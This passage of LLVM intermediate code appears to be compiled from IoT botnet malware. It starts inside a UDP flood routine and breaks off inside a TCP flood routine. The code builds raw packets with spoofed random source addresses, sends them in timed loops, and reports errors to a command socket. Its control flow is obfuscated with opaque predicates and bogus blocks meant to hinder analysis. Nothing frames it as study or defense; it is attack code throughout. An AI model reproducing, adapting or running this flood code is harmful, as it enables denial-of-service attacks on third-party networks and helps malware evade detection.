  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %461

; <label>:231:                                    ; preds = %207
  store i32 50, i32* %21, align 4
  br label %232

; <label>:232:                                    ; preds = %252, %231
  %233 = load i32, i32* @x.65
  %234 = load i32, i32* @y.66
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %232
  %241 = load i32, i32* %21, align 4
  %242 = add nsw i32 %241, -1
  store i32 %242, i32* %21, align 4
  %243 = icmp ne i32 %241, 0
  %244 = load i32, i32* @x.65
  %245 = load i32, i32* @y.66
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart249, label %originalBB46alteredBB

originalBBpart249:                                ; preds = %originalBB46
  br i1 %243, label %252, label %257

; <label>:252:                                    ; preds = %originalBBpart249
  %253 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %254 = call i32 @rand_cmwc()
  %255 = xor i32 %253, %254
  call void @srand(i32 %255) #2
  %256 = call i32 @rand() #2
  call void @init_rand(i32 %256)
  br label %232

; <label>:257:                                    ; preds = %originalBBpart249
  %258 = load i32, i32* @x.65
  %259 = load i32, i32* @y.66
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB51, label %originalBB51alteredBB

originalBB51:                                     ; preds = %originalBB51alteredBB, %257
  %266 = load i32, i32* %10, align 4
  %267 = icmp eq i32 %266, 0
  %268 = load i32, i32* @x.65
  %269 = load i32, i32* @y.66
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart253, label %originalBB51alteredBB

originalBBpart253:                                ; preds = %originalBB51
  br i1 %267, label %276, label %277

; <label>:276:                                    ; preds = %originalBBpart253
  store i32 0, i32* %22, align 4
  br label %299

; <label>:277:                                    ; preds = %originalBBpart253
  %278 = load i32, i32* @x.65
  %279 = load i32, i32* @y.66
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBB55, label %originalBB55alteredBB

originalBB55:                                     ; preds = %originalBB55alteredBB, %277
  %286 = load i32, i32* %10, align 4
  %287 = sub nsw i32 32, %286
  %288 = shl i32 1, %287
  %289 = sub nsw i32 %288, 1
  %290 = xor i32 %289, -1
  store i32 %290, i32* %22, align 4
  %291 = load i32, i32* @x.65
  %292 = load i32, i32* @y.66
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart298, label %originalBB55alteredBB

originalBBpart298:                                ; preds = %originalBB55
  br label %299

; <label>:299:                                    ; preds = %originalBBpart298, %276
  %300 = load i32, i32* %11, align 4
  %301 = sext i32 %300 to i64
  %302 = add i64 28, %301
  %303 = call i8* @llvm.stacksave()
  store i8* %303, i8** %23, align 8
  %304 = alloca i8, i64 %302, align 16
  %305 = bitcast i8* %304 to %struct.iphdr*
  store %struct.iphdr* %305, %struct.iphdr** %24, align 8
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = bitcast %struct.iphdr* %306 to i8*
  %308 = getelementptr i8, i8* %307, i64 20
  %309 = bitcast i8* %308 to %struct.udphdr*
  store %struct.udphdr* %309, %struct.udphdr** %25, align 8
  %310 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %311 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 2
  %312 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %311, i32 0, i32 0
  %313 = load i32, i32* %312, align 4
  %314 = load i32, i32* %22, align 4
  %315 = call i32 @getRandomIP(i32 %314)
  %316 = call i32 @htonl(i32 %315) #13
  %317 = load i32, i32* %11, align 4
  %318 = sext i32 %317 to i64
  %319 = add i64 8, %318
  %320 = trunc i64 %319 to i32
  call void @makeIPPacket(%struct.iphdr* %310, i32 %313, i32 %316, i8 zeroext 17, i32 %320)
  %321 = load i32, i32* %11, align 4
  %322 = sext i32 %321 to i64
  %323 = add i64 8, %322
  %324 = trunc i64 %323 to i16
  %325 = call zeroext i16 @htons(i16 zeroext %324) #13
  %326 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %327 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %326, i32 0, i32 0
  %328 = bitcast %union.anon.2* %327 to %struct.anon.3*
  %329 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %328, i32 0, i32 2
  store i16 %325, i16* %329, align 2
  %330 = call i32 @rand_cmwc()
  %331 = trunc i32 %330 to i16
  %332 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %333 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %332, i32 0, i32 0
  %334 = bitcast %union.anon.2* %333 to %struct.anon.3*
  %335 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %334, i32 0, i32 0
  store i16 %331, i16* %335, align 2
  %336 = load i32, i32* %8, align 4
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %338, label %340

; <label>:338:                                    ; preds = %299
  %339 = call i32 @rand_cmwc()
  br label %345

; <label>:340:                                    ; preds = %299
  %341 = load i32, i32* %8, align 4
  %342 = trunc i32 %341 to i16
  %343 = call zeroext i16 @htons(i16 zeroext %342) #13
  %344 = zext i16 %343 to i32
  br label %345

; <label>:345:                                    ; preds = %340, %338
  %346 = phi i32 [ %339, %338 ], [ %344, %340 ]
  %347 = trunc i32 %346 to i16
  %348 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i32 0, i32 0
  %350 = bitcast %union.anon.2* %349 to %struct.anon.3*
  %351 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %350, i32 0, i32 1
  store i16 %347, i16* %351, align 2
  %352 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %353 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %352, i32 0, i32 0
  %354 = bitcast %union.anon.2* %353 to %struct.anon.3*
  %355 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %354, i32 0, i32 3
  store i16 0, i16* %355, align 2
  %356 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %357 = bitcast %struct.udphdr* %356 to i8*
  %358 = getelementptr inbounds i8, i8* %357, i64 8
  %359 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %358, i32 %359)
  %360 = bitcast i8* %304 to i16*
  %361 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %362 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %361, i32 0, i32 2
  %363 = load i16, i16* %362, align 2
  %364 = zext i16 %363 to i32
  %365 = call zeroext i16 @csum(i16* %360, i32 %364)
  %366 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %367 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %366, i32 0, i32 7
  store i16 %365, i16* %367, align 2
  %368 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %369 = load i32, i32* %9, align 4
  %370 = add nsw i32 %368, %369
  store i32 %370, i32* %26, align 4
  store i32 0, i32* %27, align 4
  br label %371

; <label>:371:                                    ; preds = %440, %439, %345
  br label %372

; <label>:372:                                    ; preds = %371
  %373 = load i32, i32* @x.65
  %374 = load i32, i32* @y.66
  %375 = sub i32 %373, 1
  %376 = mul i32 %373, %375
  %377 = urem i32 %376, 2
  %378 = icmp eq i32 %377, 0
  %379 = icmp slt i32 %374, 10
  %380 = or i1 %378, %379
  br i1 %380, label %originalBB100, label %originalBB100alteredBB

originalBB100:                                    ; preds = %originalBB100alteredBB, %372
  %381 = load i32, i32* %19, align 4
  %382 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %383 = call i64 @sendto(i32 %381, i8* %304, i64 %302, i32 0, %struct.sockaddr* %382, i32 16)
  %384 = call i32 @rand_cmwc()
  %385 = trunc i32 %384 to i16
  %386 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i32 0, i32 0
  %388 = bitcast %union.anon.2* %387 to %struct.anon.3*
  %389 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %388, i32 0, i32 0
  store i16 %385, i16* %389, align 2
  %390 = load i32, i32* %8, align 4
  %391 = icmp eq i32 %390, 0
  %392 = load i32, i32* @x.65
  %393 = load i32, i32* @y.66
  %394 = sub i32 %392, 1
  %395 = mul i32 %392, %394
  %396 = urem i32 %395, 2
  %397 = icmp eq i32 %396, 0
  %398 = icmp slt i32 %393, 10
  %399 = or i1 %397, %398
  br i1 %399, label %originalBBpart2102, label %originalBB100alteredBB

originalBBpart2102:                               ; preds = %originalBB100
  br i1 %391, label %400, label %402

; <label>:400:                                    ; preds = %originalBBpart2102
  %401 = call i32 @rand_cmwc()
  br label %407

; <label>:402:                                    ; preds = %originalBBpart2102
  %403 = load i32, i32* %8, align 4
  %404 = trunc i32 %403 to i16
  %405 = call zeroext i16 @htons(i16 zeroext %404) #13
  %406 = zext i16 %405 to i32
  br label %407

; <label>:407:                                    ; preds = %402, %400
  %408 = phi i32 [ %401, %400 ], [ %406, %402 ]
  %409 = trunc i32 %408 to i16
  %410 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %411 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon.2* %411 to %struct.anon.3*
  %413 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %412, i32 0, i32 1
  store i16 %409, i16* %413, align 2
  %414 = call i32 @rand_cmwc()
  %415 = trunc i32 %414 to i16
  %416 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 3
  store i16 %415, i16* %417, align 4
  %418 = load i32, i32* %22, align 4
  %419 = call i32 @getRandomIP(i32 %418)
  %420 = call i32 @htonl(i32 %419) #13
  %421 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %422 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %421, i32 0, i32 8
  store i32 %420, i32* %422, align 4
  %423 = bitcast i8* %304 to i16*
  %424 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 2
  %426 = load i16, i16* %425, align 2
  %427 = zext i16 %426 to i32
  %428 = call zeroext i16 @csum(i16* %423, i32 %427)
  %429 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 7
  store i16 %428, i16* %430, align 2
  %431 = load i32, i32* %27, align 4
  %432 = load i32, i32* %14, align 4
  %433 = icmp eq i32 %431, %432
  br i1 %433, label %434, label %440

; <label>:434:                                    ; preds = %407
  %435 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %436 = load i32, i32* %26, align 4
  %437 = icmp sgt i32 %435, %436
  br i1 %437, label %438, label %439

; <label>:438:                                    ; preds = %434
  br label %443

; <label>:439:                                    ; preds = %434
  store i32 0, i32* %27, align 4
  br label %371

; <label>:440:                                    ; preds = %407
  %441 = load i32, i32* %27, align 4
  %442 = add i32 %441, 1
  store i32 %442, i32* %27, align 4
  br label %371

; <label>:443:                                    ; preds = %438
  %444 = load i32, i32* @x.65
  %445 = load i32, i32* @y.66
  %446 = sub i32 %444, 1
  %447 = mul i32 %444, %446
  %448 = urem i32 %447, 2
  %449 = icmp eq i32 %448, 0
  %450 = icmp slt i32 %445, 10
  %451 = or i1 %449, %450
  br i1 %451, label %originalBB104, label %originalBB104alteredBB

originalBB104:                                    ; preds = %originalBB104alteredBB, %443
  %452 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %452)
  %453 = load i32, i32* @x.65
  %454 = load i32, i32* @y.66
  %455 = sub i32 %453, 1
  %456 = mul i32 %453, %455
  %457 = urem i32 %456, 2
  %458 = icmp eq i32 %457, 0
  %459 = icmp slt i32 %454, 10
  %460 = or i1 %458, %459
  br i1 %460, label %originalBBpart2106, label %originalBB104alteredBB

originalBBpart2106:                               ; preds = %originalBB104
  br label %461

; <label>:461:                                    ; preds = %originalBBpart2106, %originalBBpart244, %204, %183, %98, %72, %61
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %31
  %462 = call i32 @rand_cmwc()
  %463 = trunc i32 %462 to i16
  %464 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %463, i16* %464, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %75
  %465 = load i32, i32* %11, align 4
  %_ = sub i32 %465, 1
  %gen = mul i32 %_, 1
  %466 = add nsw i32 %465, 1
  %467 = sext i32 %466 to i64
  %468 = call noalias i8* @malloc(i64 %467) #2
  store i8* %468, i8** %16, align 8
  %469 = load i8*, i8** %16, align 8
  %470 = icmp eq i8* %469, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %99
  %471 = load i8*, i8** %16, align 8
  %472 = load i32, i32* %11, align 4
  %_7 = sub i32 0, %472
  %gen8 = add i32 %_7, 1
  %_9 = sub i32 %472, 1
  %gen10 = mul i32 %_9, 1
  %473 = add nsw i32 %472, 1
  %474 = sext i32 %473 to i64
  call void @llvm.memset.p0i8.i64(i8* %471, i8 0, i64 %474, i32 1, i1 false)
  %475 = load i8*, i8** %16, align 8
  %476 = load i32, i32* %11, align 4
  call void @makeRandomStr(i8* %475, i32 %476)
  %477 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %478 = load i32, i32* %9, align 4
  %_11 = sub i32 %477, %478
  %gen12 = mul i32 %_11, %478
  %_13 = shl i32 %477, %478
  %_14 = shl i32 %477, %478
  %_15 = sub i32 %477, %478
  %gen16 = mul i32 %_15, %478
  %_17 = sub i32 %477, %478
  %gen18 = mul i32 %_17, %478
  %_19 = sub i32 %477, %478
  %gen20 = mul i32 %_19, %478
  %_21 = sub i32 0, %477
  %gen22 = add i32 %_21, %478
  %_23 = sub i32 %477, %478
  %gen24 = mul i32 %_23, %478
  %_25 = sub i32 %477, %478
  %gen26 = mul i32 %_25, %478
  %479 = add nsw i32 %477, %478
  store i32 %479, i32* %17, align 4
  store i32 0, i32* %18, align 4
  br label %originalBB6

originalBB30alteredBB:                            ; preds = %originalBB30, %138
  %480 = call i32 @rand_cmwc()
  %481 = trunc i32 %480 to i16
  %482 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %13, i32 0, i32 1
  store i16 %481, i16* %482, align 2
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %163
  store i32 0, i32* %18, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %184
  %483 = call i32 @socket(i32 2, i32 3, i32 17) #2
  store i32 %483, i32* %19, align 4
  %484 = load i32, i32* %19, align 4
  %485 = icmp ne i32 %484, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %212
  %486 = load i32, i32* @mainCommSock, align 4
  %487 = call i32 (i32, i8*, ...) @sockprintf(i32 %486, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.34, i32 0, i32 0))
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %232
  %488 = load i32, i32* %21, align 4
  %_47 = shl i32 %488, -1
  %489 = add nsw i32 %488, -1
  store i32 %489, i32* %21, align 4
  %490 = icmp ne i32 %488, 0
  br label %originalBB46

originalBB51alteredBB:                            ; preds = %originalBB51, %257
  %491 = load i32, i32* %10, align 4
  %492 = icmp eq i32 %491, 0
  br label %originalBB51

originalBB55alteredBB:                            ; preds = %originalBB55, %277
  %493 = load i32, i32* %10, align 4
  %_56 = shl i32 32, %493
  %_57 = sub i32 0, 32
  %gen58 = add i32 %_57, %493
  %_59 = sub i32 32, %493
  %gen60 = mul i32 %_59, %493
  %_61 = sub i32 0, 32
  %gen62 = add i32 %_61, %493
  %494 = sub nsw i32 32, %493
  %_63 = sub i32 1, %494
  %gen64 = mul i32 %_63, %494
  %_65 = sub i32 0, 1
  %gen66 = add i32 %_65, %494
  %_67 = sub i32 0, 1
  %gen68 = add i32 %_67, %494
  %_69 = sub i32 0, 1
  %gen70 = add i32 %_69, %494
  %_71 = sub i32 1, %494
  %gen72 = mul i32 %_71, %494
  %495 = shl i32 1, %494
  %_73 = sub i32 0, %495
  %gen74 = add i32 %_73, 1
  %_75 = sub i32 0, %495
  %gen76 = add i32 %_75, 1
  %_77 = sub i32 0, %495
  %gen78 = add i32 %_77, 1
  %_79 = shl i32 %495, 1
  %_80 = shl i32 %495, 1
  %_81 = sub i32 0, %495
  %gen82 = add i32 %_81, 1
  %496 = sub nsw i32 %495, 1
  %_83 = sub i32 0, %496
  %gen84 = add i32 %_83, -1
  %_85 = sub i32 0, %496
  %gen86 = add i32 %_85, -1
  %_87 = sub i32 %496, -1
  %gen88 = mul i32 %_87, -1
  %_89 = sub i32 0, %496
  %gen90 = add i32 %_89, -1
  %_91 = sub i32 %496, -1
  %gen92 = mul i32 %_91, -1
  %_93 = shl i32 %496, -1
  %_94 = shl i32 %496, -1
  %_95 = sub i32 %496, -1
  %gen96 = mul i32 %_95, -1
  %497 = xor i32 %496, -1
  store i32 %497, i32* %22, align 4
  br label %originalBB55

originalBB100alteredBB:                           ; preds = %originalBB100, %372
  %498 = load i32, i32* %19, align 4
  %499 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %500 = call i64 @sendto(i32 %498, i8* %304, i64 %302, i32 0, %struct.sockaddr* %499, i32 16)
  %501 = call i32 @rand_cmwc()
  %502 = trunc i32 %501 to i16
  %503 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %504 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %503, i32 0, i32 0
  %505 = bitcast %union.anon.2* %504 to %struct.anon.3*
  %506 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %505, i32 0, i32 0
  store i16 %502, i16* %506, align 2
  %507 = load i32, i32* %8, align 4
  %508 = icmp eq i32 %507, 0
  br label %originalBB100

originalBB104alteredBB:                           ; preds = %originalBB104, %443
  %509 = load i8*, i8** %23, align 8
  call void @llvm.stackrestore(i8* %509)
  br label %originalBB104
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i32 %3, i32* %11, align 4
  store i8* %4, i8** %12, align 8
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %14, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %39
  %45 = load i32, i32* @x.67
  %46 = load i32, i32* @y.68
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %44
  %53 = load i32, i32* @x.67
  %54 = load i32, i32* @y.68
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %499

; <label>:61:                                     ; preds = %39
  %62 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %63 = getelementptr inbounds [8 x i8], [8 x i8]* %62, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %63, i8 0, i64 8, i32 4, i1 false)
  %64 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %64, i32* %17, align 4
  %65 = load i32, i32* %17, align 4
  %66 = icmp ne i32 %65, 0
  br i1 %66, label %86, label %67

; <label>:67:                                     ; preds = %61
  %68 = load i32, i32* @x.67
  %69 = load i32, i32* @y.68
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %67
  %76 = load i32, i32* @mainCommSock, align 4
  %77 = call i32 (i32, i8*, ...) @sockprintf(i32 %76, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.33, i32 0, i32 0))
  %78 = load i32, i32* @x.67
  %79 = load i32, i32* @y.68
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %499

; <label>:86:                                     ; preds = %61
  store i32 1, i32* %18, align 4
  %87 = load i32, i32* %17, align 4
  %88 = bitcast i32* %18 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #2
  %90 = icmp slt i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %86
  %92 = load i32, i32* @mainCommSock, align 4
  %93 = call i32 (i32, i8*, ...) @sockprintf(i32 %92, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.34, i32 0, i32 0))
  br label %499

; <label>:94:                                     ; preds = %86
  %95 = load i32, i32* @x.67
  %96 = load i32, i32* @y.68
  %97 = sub i32 %95, 1
  %98 = mul i32 %95, %97
  %99 = urem i32 %98, 2
  %100 = icmp eq i32 %99, 0
  %101 = icmp slt i32 %96, 10
  %102 = or i1 %100, %101
  br i1 %102, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %94
  %103 = load i32, i32* %11, align 4
  %104 = icmp eq i32 %103, 0
  %105 = load i32, i32* @x.67
  %106 = load i32, i32* @y.68
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %104, label %113, label %114

; <label>:113:                                    ; preds = %originalBBpart28
  store i32 0, i32* %19, align 4
  br label %120

; <label>:114:                                    ; preds = %originalBBpart28
  %115 = load i32, i32* %11, align 4
  %116 = sub nsw i32 32, %115
  %117 = shl i32 1, %116
  %118 = sub nsw i32 %117, 1
  %119 = xor i32 %118, -1
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %114, %113
  %121 = load i32, i32* %13, align 4
  %122 = sext i32 %121 to i64
  %123 = add i64 40, %122
  %124 = call i8* @llvm.stacksave()
  store i8* %124, i8** %20, align 8
  %125 = alloca i8, i64 %123, align 16
  %126 = bitcast i8* %125 to %struct.iphdr*
  store %struct.iphdr* %126, %struct.iphdr** %21, align 8
  %127 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %128 = bitcast %struct.iphdr* %127 to i8*
  %129 = getelementptr i8, i8* %128, i64 20
  %130 = bitcast i8* %129 to %struct.tcphdr*
  store %struct.tcphdr* %130, %struct.tcphdr** %22, align 8
  %131 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %133 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %132, i32 0, i32 0
  %134 = load i32, i32* %133, align 4
  %135 = load i32, i32* %19, align 4
  %136 = call i32 @getRandomIP(i32 %135)
  %137 = call i32 @htonl(i32 %136) #13
  %138 = load i32, i32* %13, align 4
  %139 = sext i32 %138 to i64
  %140 = add i64 20, %139
  %141 = trunc i64 %140 to i32
  call void @makeIPPacket(%struct.iphdr* %131, i32 %134, i32 %137, i8 zeroext 6, i32 %141)
  %142 = call i32 @rand_cmwc()
  %143 = trunc i32 %142 to i16
  %144 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %145 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %144, i32 0, i32 0
  %146 = bitcast %union.anon.0* %145 to %struct.anon.1*
  %147 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %146, i32 0, i32 0
  store i16 %143, i16* %147, align 4
  %148 = call i32 @rand_cmwc()
  %149 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %150 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %149, i32 0, i32 0
  %151 = bitcast %union.anon.0* %150 to %struct.anon.1*
  %152 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %151, i32 0, i32 2
  store i32 %148, i32* %152, align 4
  %153 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon.0* %154 to %struct.anon.1*
  %156 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %155, i32 0, i32 3
  store i32 0, i32* %156, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.0* %158 to %struct.anon.1*
  %160 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %159, i32 0, i32 4
  %161 = load i16, i16* %160, align 4
  %162 = and i16 %161, -241
  %163 = or i16 %162, 80
  store i16 %163, i16* %160, align 4
  %164 = load i8*, i8** %12, align 8
  %165 = call i32 @strcmp(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.35, i32 0, i32 0)) #10
  %166 = icmp ne i32 %165, 0
  br i1 %166, label %203, label %167

; <label>:167:                                    ; preds = %120
  %168 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %169 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %168, i32 0, i32 0
  %170 = bitcast %union.anon.0* %169 to %struct.anon.1*
  %171 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %170, i32 0, i32 4
  %172 = load i16, i16* %171, align 4
  %173 = and i16 %172, -513
  %174 = or i16 %173, 512
  store i16 %174, i16* %171, align 4
  %175 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
